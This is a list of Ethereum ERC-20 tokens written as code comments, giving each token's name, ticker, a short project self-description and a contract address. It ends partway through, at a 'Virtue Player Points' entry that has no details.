// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668

// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// Measurable Data Token (MDT)
// Decentralized Data Exchange Economy.
// 0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26

// Pluton (PLU)
// With Plutus Tap & Pay, you can pay at any NFC-enabled merchant
// 0xD8912C10681D8B21Fd3742244f44658dBA12264E

// Frontier Token (FRONT)
// Frontier is a chain-agnostic DeFi aggregation layer. To date, they have added support for DeFi on Ethereum, Binance Chain, BandChain, Kava, and Harmony. Via StaFi Protocol, they will enter into the Polkadot ecosystem, and will now put vigorous efforts towards Serum.
// 0xf8C3527CC04340b208C854E985240c02F7B7793f

// Quantstamp (QSP)
// QSP is an ERC-20 token used for verifying smart contracts on the decentralized QSP Security Protocol. Users can buy automated scans of smart contracts with QSP, and validators can earn QSP for helping provide decentralized security scans on the network at protocol.quantstamp.com.
// 0x99ea4db9ee77acd40b119bd1dc4e33e1c070b80d

// FEGtoken (FEG)
// FEG is an experimental progressive deflationary DeFi token whereby on each transcation, a tax of 1% will be distributed to the holders and a further 1% will be burnt, hence incentivising holders to hodl and decreasing the supply overtime.
// 0x389999216860ab8e0175387a0c90e5c52522c945

// BOSAGORA (BOA)
// Transitional token for the BOSAgora platform
// 0x746dda2ea243400d5a63e0700f190ab79f06489e

// NAGA Coin (NGC)
// The NAGA CARD allows you to fund with cryptos and spend your money (online/offline) all around the globe.
// 0x72dd4b6bd852a3aa172be4d6c5a6dbec588cf131

// dForce (DF)
// DF is the platform utility token of the dForce network to be used for transaction services, community governance, system stabilizer, incentivization, validator deposit when we migrate to staking model, and etc.
// 0x431ad2ff6a9c365805ebad47ee021148d6f7dbe0

// WaykiCoin (WIC)
// WaykiChain aims to build the blockchain 3.0 commercial public chain, provide enterprise-level blockchain infrastructure and industry solutions, and create a new business model in the new era.
// 0x4f878c0852722b0976a955d68b376e4cd4ae99e5

// CRPT (CRPT)
// Crypterium is building a mobile app that lets users spend cryptocurrency in everyday life.
// 0x08389495d7456e1951ddf7c3a1314a4bfb646d8b

// Decentral Games Governance (xDG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4f81c790581b240a5c948afd173620ecc8c71c8d

// Shiden (SDN)
// Shiden Network is a multi-chain decentralized application layer on Kusama Network.
// 0x00e856ee945a49bb73436e719d96910cd9d116a4

// Guaranteed Entrance Token (GET)
// The GET Protocol offers a blockchain-based smart ticketing solution that can be used by everybody who needs to issue admission tickets in an honest and transparent way.
// 0x8a854288a5976036a725879164ca3e91d30c6a1b

// Fuse Token (FUSE)
// Fuse is a no-code smart contract platform for entrepreneurs that allows entrepreneurs to integrate everyday payments into their business.
// 0x970b9bb2c0444f5e81e9d0efb84c8ccdcdcaf84d

// Instadapp (INST)
// Instadapp is an open source and non-custodial middleware platform for decentralized finance applications.
// 0x6f40d4a6237c257fff2db00fa0510deeecd303eb

// Blockport (BPT)
// Social crypto exchange based on a hybrid-decentralized architecture.
// 0x327682779bab2bf4d1337e8974ab9de8275a7ca8

// Kryll (KRL)
// A Crypto Traders Community
// 0x464ebe77c293e473b48cfe96ddcf88fcf7bfdac0

// Ultiledger (ULT)
// Credit circulation, Asset circulation, Value circulation. The next generation global self-financing blockchain protocol.
// 0xe884cc2795b9c45beeac0607da9539fd571ccf85

// UTN-P: Universa Token (UTNP)
// The Universa blockchain is a cooperative ledger of state changes, performed by licensed and trusted nodes.
// 0x9e3319636e2126e3c0bc9e3134aec5e1508a46c7

// Route (ROUTE)
// Router Protocol is a crosschain-liquidity aggregator platform that was built to seamlessly provide bridging infrastructure between current and emerging Layer 1 and Layer 2 blockchain solutions.
// 0x16eccfdbb4ee1a85a33f3a9b21175cd7ae753db4

// Dock (DOCK)
// dock.io is a decentralized data exchange protocol that lets people connect their profiles, reputations and experiences across the web with privacy and security.
// 0xe5dada80aa6477e85d09747f2842f7993d0df71c

// BetProtocolToken (BEPRO)
// BetProtocol enables entrepreneurs and developers to create gaming platforms in minutes. No coding required.
// 0xcf3c8be2e2c42331da80ef210e9b1b307c03d36a

// QRL (QRL)
// The Quantum Resistant Ledger (QRL) aims to be a future-proof post-quantum value store and decentralized communication layer which tackles the threat Quantum Computing will pose to cryptocurrencies.
// 0x697beac28b09e122c4332d163985e8a73121b97f

// StackOS (STACK)
// StackOS is an open protocol that allows individuals to collectively offer a decentralized cloud where you can deploy any full-stack application, decentralized app, blockchain privatenets, and mainnet nodes.
// 0x56a86d648c435dc707c8405b78e2ae8eb4e60ba4

// Yuan Chain New (YCC)
// 0x37e1160184f7dd29f00b78c050bf13224780b0b0

// GRID (GRID)
// Grid+ creates products that enable mainstream use of digital assets and cryptocurrencies. Grid+ strives to be the hardware, software, and cryptocurrency experts building the foundation for a more efficient and inclusive financial future.
// 0x12b19d3e2ccc14da04fae33e63652ce469b3f2fd

// DEXTools (DEXT)
// DEXTools is a trading assistan platform with which you can access features such as Token Catcher, Spreader, Ob search and more.
// 0xfb7b4564402e5500db5bb6d63ae671302777c75a

// SAN (SAN)
// A Better Way to Trade Crypto-Markets - Market Datafeeds, Newswires, and Crowd Sentiment Insights for the Blockchain World
// 0x7c5a0ce9267ed19b22f8cae653f198e3e8daf098

// TE-FOOD/TustChain (TONE)
// A food traceability solution.
// 0x2Ab6Bb8408ca3199B8Fa6C92d5b455F820Af03c4

// hoge.finance (HOGE)
// The HOGE token has a 2% tax on each transaction. One trillion tokens were minted for the initial supply. Half of the tokens were immediately burned. Burning the initial supply balanced the starting transactions. It ensured redistribution was proportionally weighted among wallet holders.
// 0xfad45e47083e4607302aa43c65fb3106f1cd7607

// Civilization (CIV)
// CIV is a Dex Fund that developed for transforming staking and investment. Auditable automated code, community-driven, multi-strategy trading for maximum yield at minimum risk.
// 0x37fe0f067fa808ffbdd12891c0858532cfe7361d

// ELYSIA (EL)
// Elysia connects real estate buyers and sellers around the world. At Elysia, anyone can buy and sell fractions of real estate properties and receive equal ownership interest. $EL is used for various transactions inside the platform and EL is used to pay fees will be burned on a quarterly basis.
// 0x2781246fe707bb15cee3e5ea354e2154a2877b16

// Gifto (GTO)
// Decentralized Universal Gifting Protocol.
// 0xc5bbae50781be1669306b9e001eff57a2957b09d

// AOG (AOG)
// Smartofgiving (AOG) is an idea-turned-reality that envisioned a unique model to generate funds for charities without asking for monetary donation.
// 0x8578530205cecbe5db83f7f29ecfeec860c297c2

// ANGLE (ANGLE)
// Angle is an over-collateralized, decentralized and capital-efficient stablecoin protocol.
// 0x31429d1856ad1377a8a0079410b297e1a9e214c2

// RAE Token (RAE)
// Receive Access Ecosystem (RAE) token gives content creators a drop-dead easy way to tap into subscription revenue and digital network effects.
// 0xe5a3229ccb22b6484594973a03a3851dcd948756

// ParaSwap (PSP)
// ParaSwap aggregates decentralized exchanges and other DeFi services in one comprehensive interface to streamline and facilitate users' interactions with decentralized finance on Ethereum and EVM-compatible chains: Polygon, Avalanche, BSC & more to come.
// 0xcafe001067cdef266afb7eb5a286dcfd277f3de5

// AirSwap (AST)
// AirSwap is based on the Swap protocol, a peer-to-peer protocol for trading Ethereum tokens
// 0x27054b13b1b798b345b591a4d22e6562d47ea75a

// Metronome (MET)
// A new cryptocurrency focused on making greater decentralization possible and delivering institutional-class endurance.
// 0xa3d58c4e56fedcae3a7c43a725aee9a71f0ece4e

// NimiqNetwork (NET)
// A Browser-based Blockchain & Ecosystem
// 0xcfb98637bcae43C13323EAa1731cED2B716962fD

// VISOR (VISR)
// Ability to interact with DeFi protocols through an NFT in order to enhance the discovery, reputation, safety and programmability of on-chain liquidity.
// 0xf938424f7210f31df2aee3011291b658f872e91e

// Imported GBYTE (GBYTE)
// Obyte is a distributed ledger based on directed acyclic graph (DAG). Unlike centralized ledgers and blockchains, access to Obyte ledger is decentralized, disintermediated, free (as in freedom), equal, and open.
// 0x31f69de127c8a0ff10819c0955490a4ae46fcc2a

// pNetwork Token (PNT)
// pNetwork is the heartbeat of cross-chain composability. As the governance network for the pTokens system, it enables the seamless movement of assets across blockchains.
// 0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD

// UniLend Finance Token (UFT)
// UniLend is a permission-less decentralized protocol that combines spot trading services and money markets with lending and services through smart contracts.
// 0x0202Be363B8a4820f3F4DE7FaF5224fF05943AB1

// Stake DAO Token (SDT)
// Stake DAO offers a simple solution for staking a variety of tokens all from one dashboard. Users can search through the best of DeFi and choose from the best products to help them beat the market.
// 0x73968b9a57c6e53d41345fd57a6e6ae27d6cdb2f

// NUM Token (NUM)
// Numbers protocol is a decentralised photo network, for creating community, value and trust in digital media.
// 0x3496b523e5c00a4b4150d6721320cddb234c3079

// Eden (EDEN)
// Eden is a priority transaction network that protects traders from frontrunning, aligns incentives for block producers, and redistributes miner extractable value.
// 0x1559fa1b8f28238fd5d76d9f434ad86fd20d1559

// SwftCoin (SWFTC)
// SWFT is a cross-blockchain platform.
// 0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e

// Dragon (DRGN)
// Dragonchain simplifies the integration of real business applications onto a blockchain.
// 0x419c4db4b9e25d6db2ad9691ccb832c8d9fda05e

// UniCrypt (UNCX)
// UniCrypt is a platform creating services for other tokens. Services such as token locking contracts, yield farming as a service and other dex orientated products.
// 0xaDB2437e6F65682B85F814fBc12FeC0508A7B1D0

// OCC (OCC)
// A decentralized launchpad and exchange designed for the Cardano ecosystem.
// 0x2f109021afe75b949429fe30523ee7c0d5b27207

// STAKE (STAKE)
// STAKE is a new ERC20 token designed to secure the on-chain payment layer and provide a mechanism for validators to receive incentives.
// 0x0Ae055097C6d159879521C384F1D2123D1f195e6

// Shyft [ Wrapped ] (SHFT)
// Shyft Network is a public protocol designed to aggregate and embed trust, validation, and discoverability into data stored on public and private ecosystems.
// 0xb17c88bda07d28b3838e0c1de6a30eafbcf52d85

// Switcheo Token (SWTH)
// Switcheo offers a cross-chain trading protocol for any asset and its derivatives.
// 0xb4371da53140417cbb3362055374b10d97e420bb

// Interest Compounding ETH Index (icETH)
// The Interest Compounding ETH Index from the Index Coop enhances staking returns with a leveraged liquid staking strategy. icETH multiplies the staking rate for stETH while minimizing transaction costs and risk associated with maintaining collateralized debt in Aave.
// 0x7c07f7abe10ce8e33dc6c5ad68fe033085256a84

// veCRV-DAO yVault (yveCRV-DAO)
// 0xc5bddf9843308380375a611c18b50fb9341f502a

// Coinvest COIN V3 Token (COIN)
// Coinvest is a trading platform (and market maker) where you make investment transactions and redeem profit from your trades through a process that is decentralized and handled by smart contracts.
// 0xeb547ed1D8A3Ff1461aBAa7F0022FED4836E00A4

// Cashaa (CAS)
// We welcome Crypto Businesses! We know crypto-related businesses are underserved by banks. Our goal is to create a hassle-free banking experience for ICO-backed companies, exchanges, wallets, and brokers. Come and discover the world of crypto-friendly banking.
// 0xe8780b48bdb05f928697a5e8155f672ed91462f7

// Meta (MTA)
// mStable is a protocol that unites stablecoins, lending, and swapping into one robust and easy to use standard.
// 0xa3BeD4E1c75D00fa6f4E5E6922DB7261B5E9AcD2

// KAN (KAN)
// A decentralized cryptocurrency-concentrated & content payment community.
// 0x1410434b0346f5be678d0fb554e5c7ab620f8f4a

// 0xBitcoin Token (0xBTC)
// Pure mined digital currency for Ethereum
// 0xb6ed7644c69416d67b522e20bc294a9a9b405b31

// Ixs Token (IXS)
// IX Swap is the “Uniswap” for security tokens (STO) and tokenized stocks (TSO). IX Swap will be the FIRST platform to provide liquidity pools and automated market making functions for the security token (STO) & tokenized stock industry (TSO).
// 0x73d7c860998ca3c01ce8c808f5577d94d545d1b4

// Shopping.io (SPI)
// Shopping.io is a state of the art platform that unifies all major eCommerce platforms, allowing consumers to enjoy online shopping seamlessly, securely, and cost-effectively.
// 0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7

// SunContract (SNC)
// The SunContract platform aims to empower individuals, with an emphasis on home owners, to freely buy, sell or trade electricity.
// 0xF4134146AF2d511Dd5EA8cDB1C4AC88C57D60404


// Curate (XCUR)
// Curate is a shopping rewards app for rewarding users with free cashback and crypto on all their purchases.
// 0xE1c7E30C42C24582888C758984f6e382096786bd


// CyberMiles (CMT)
// Empowering the Decentralization of Online Marketplaces.
// 0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f


// PAR Stablecoin (PAR)
// Mimo is a company building DeFi tools in the hope to make blockchain more usable to everyone. They have a lending platform allowing people to borrow PAR and their stable token is algorithmically pegged to the Euro.
// 0x68037790a0229e9ce6eaa8a99ea92964106c4703


// Moeda Loyalty Points (MDA)
// Moeda is a cooperative banking system powered by blockchain, built for everyone.
// 0x51db5ad35c671a87207d88fc11d593ac0c8415bd


// DivergenceProtocol (DIVER)
// A platform for on-chain composable crypto options.
// 0xfb782396c9b20e564a64896181c7ac8d8979d5f4


// Spheroid (SPH)
// Spheroid Universe is a MetaVerse for entertainment, games, advertising, and business in the world of Extended Reality. It operates geo-localized private property on Earth's digital surface (Spaces). The platform’s tech foundation is the Spheroid XR Cloud and the Spheroid Script programming language.
// 0xa0cf46eb152656c7090e769916eb44a138aaa406


// PIKA (PIKA)
// PikaCrypto is an ERC-20 meme token project.
// 0x60f5672a271c7e39e787427a18353ba59a4a3578
	

// Monolith (TKN)
// Non-custodial contract wallet paired with a debit card to spend your ETH & ERC-20 tokens in real life.
// 0xaaaf91d9b90df800df4f55c205fd6989c977e73a


// stakedETH (stETH)
// stakedETH (stETH) from StakeHound is a tokenized representation of ETH staked in Ethereum 2.0 mainnet which allows holders to earn Eth2 staking rewards while participating in the Ethereum DeFi ecosystem. Staking rewards are distributed directly into holders' wallets.
// 0xdfe66b14d37c77f4e9b180ceb433d1b164f0281d


// Salt (SALT)
// SALT lets you leverage your blockchain assets to secure cash loans. We make it easy to get money without having to sell your favorite investment.
// 0x4156D3342D5c385a87D264F90653733592000581


// Tidal Token (TIDAL)
// Tidal is an insurance platform enabling custom pools to cover DeFi protocols.
// 0x29cbd0510eec0327992cd6006e63f9fa8e7f33b7

// Tranche Finance (SLICE)
// Tranche is a decentralized protocol for managing risk. The protocol integrates with any interest accrual token, such as Compound's cTokens and AAVE's aTokens, to create two new interest-bearing instruments, one with a fixed-rate, Tranche A, and one with a variable rate, Tranche B.
// 0x0aee8703d34dd9ae107386d3eff22ae75dd616d1


// BTC 2x Flexible Leverage Index (BTC2x-FLI)
// The WBTC Flexible Leverage Index lets you leverage a collateralized debt position in a safe and efficient way, by abstracting its management into a simple index.
// 0x0b498ff89709d3838a063f1dfa463091f9801c2b


// InnovaMinex (MINX)
// Our ultimate goal is making gold and other precious metals more accessible to all the people through our cryptocurrency, InnovaMinex (MINX).
// 0xae353daeed8dcc7a9a12027f7e070c0a50b7b6a4

// UnmarshalToken (MARSH)
// Unmarshal is the multichain DeFi Data Network. It provides the easiest way to query Blockchain data from Ethereum, Binance Smart Chain, and Polkadot.
// 0x5a666c7d92e5fa7edcb6390e4efd6d0cdd69cf37


// VIB (VIB)
// Viberate is a crowdsourced live music ecosystem and a blockchain-based marketplace, where musicians are matched with booking agencies and event organizers.
// 0x2C974B2d0BA1716E644c1FC59982a89DDD2fF724


// WaBi (WaBi)
// Wabi ecosystem connects Brands and Consumers, enabling an exchange of value. Consumers get Wabi for engaging with Ecosystem and redeem the tokens at a Marketplace for thousands of products.
// 0x286BDA1413a2Df81731D4930ce2F862a35A609fE

// Pinknode Token (PNODE)
// Pinknode empowers developers by providing node-as-a-service solutions, removing an entire layer of inefficiencies and complexities, and accelerating product life cycle.
// 0xaf691508ba57d416f895e32a1616da1024e882d2


// Lambda (LAMB)
// Blockchain based decentralized storage solution
// 0x8971f9fd7196e5cee2c1032b50f656855af7dd26


// ABCC Token (AT)
// A cryptocurrency exchange.
// 0xbf8fb919a8bbf28e590852aef2d284494ebc0657

// UNIC (UNIC)
// Unicly is a permissionless, community-governed protocol to combine, fractionalize, and trade NFTs. Built by NFT collectors and DeFi enthusiasts, the protocol incentivizes NFT liquidity and provides a seamless trading experience for fractionalized NFTs.
// 0x94e0bab2f6ab1f19f4750e42d7349f2740513ad5


// SIRIN (SRN)
// SIRIN LABS’ aims to become the world’s leader in secure open source consumer electronics, bridging the gap between the mass market and the blockchain econom
// 0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25


// Shirtum (SHI)
// Shirtum is a global ecosystem of experiences designed for fans to dive into the history of sports and interact directly with their favorite athletes, clubs and sports brands.
// 0xad996a45fd2373ed0b10efa4a8ecb9de445a4302


// CREDITS (CS)
// CREDITS is an open blockchain platform with autonomous smart contracts and the internal cryptocurrency. The platform is designed to create services for blockchain systems using self-executing smart contracts and a public data registry.
// 0x46b9ad944d1059450da1163511069c718f699d31
	

// Wrapped ETHO (ETHO)
// Immutable, decentralized, highly redundant storage network. Wide ecosystem providing EVM compatibility, IPFS, and SDK to scale use cases and applications. Strong community and dedicated developer team with passion for utilizing revolutionary technology to support free speech and freedom of data.
// 0x0b5326da634f9270fb84481dd6f94d3dc2ca7096

// OpenANX (OAX)
// Decentralized Exchange.
// 0x701c244b988a513c945973defa05de933b23fe1d


// Woofy (WOOFY)
// Wuff wuff.
// 0xd0660cd418a64a1d44e9214ad8e459324d8157f1


// Jenny Metaverse DAO Token (uJENNY)
// Jenny is the first Metaverse DAO to be built on Unicly. It is building one of the most amazing 1-of-1, collectively owned NFT collections in the world.
// 0xa499648fd0e80fd911972bbeb069e4c20e68bf22

// NapoleonX (NPX)
// The crypto asset manager piloting trading bots.
// 0x28b5e12cce51f15594b0b91d5b5adaa70f684a02


// PoolTogether (POOL)
// PoolTogether is a protocol for no-loss prize games.
// 0x0cec1a9154ff802e7934fc916ed7ca50bde6844e


// UNCL (UNCL)
// UNCL is the liquidity and yield farmable token of the Unicrypt ecosystem.
// 0x2f4eb47A1b1F4488C71fc10e39a4aa56AF33Dd49


// Medical Token Currency (MTC)
// MTC is an utility token that fuels a healthcare platform providing healthcare information to interested parties on a secure blockchain supported environment.
// 0x905e337c6c8645263d3521205aa37bf4d034e745


// TenXPay (PAY)
// TenX connects your blockchain assets for everyday use. TenX’s debit card and banking licence will allow us to be a hub for the blockchain ecosystem to connect for real-world use cases.
// 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280


// Tierion Network Token (TNT)
// Tierion creates software to reduce the cost and complexity of trust. Anchoring data to the blockchain and generating a timestamp proof.
// 0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8


// DOVU (DOV)
// DOVU, partially owned by Jaguar Land Rover, is a tokenized data economy for DeFi carbon offsetting.
// 0xac3211a5025414af2866ff09c23fc18bc97e79b1


// RipioCreditNetwork (RCN)
// Ripio Credit Network is a global credit network based on cosigned smart contracts and blockchain technology that connects lenders and borrowers located anywhere in the world and on any currency
// 0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6


// UseChain Token (USE)
// Mirror Identity Protocol and integrated with multi-level innovations in technology and structure design.
// 0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a


// TaTaTu (TTU)
// Social Entertainment Platform with an integrated rewards programme.
// 0x9cda8a60dd5afa156c95bd974428d91a0812e054


// GoBlank Token (BLANK)
// BlockWallet is a privacy-focused non-custodial crypto wallet. Besides full privacy functionality, BlockWallet comes packed with an array of features that go beyond privacy for a seamless user experience. Reclaim your financial privacy. Get BlockWallet.
	// 0x41a3dba3d677e573636ba691a70ff2d606c29666

// Rapids (RPD)
// Fast and secure payments across social media via blockchain technology
// 0x4bf4f2ea258bf5cb69e9dc0ddb4a7a46a7c10c53


// VeriSafe (VSF)
// VeriSafe aims to be the catalyst for projects, exchanges and communities to collaborate, creating an ecosystem where transparency, accountability, communication, and expertise go hand-in-hand to set a standard in the industry.
// 0xac9ce326e95f51b5005e9fe1dd8085a01f18450c


// TOP Network (TOP)
// TOP Network is a decentralized open communication network that provides cloud communication services on the blockchain.
// 0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b
	

// Virtue Player Points (VPP)
